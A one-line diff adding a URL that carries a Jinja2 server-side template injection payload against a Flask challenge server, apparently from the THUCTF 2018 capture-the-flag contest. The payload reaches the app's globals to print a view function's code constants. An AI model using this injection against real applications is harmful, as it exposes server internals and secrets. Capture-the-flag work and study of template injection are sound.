@@ -1,0 +1,1 @@
+view-source:http://flask.thuctf2018.game.redbud.info:8000/welcome?msg={%print%20url_for.__globals__[%27current_app%27].view_functions.ses.__code__.co_consts%20|%20safe%}
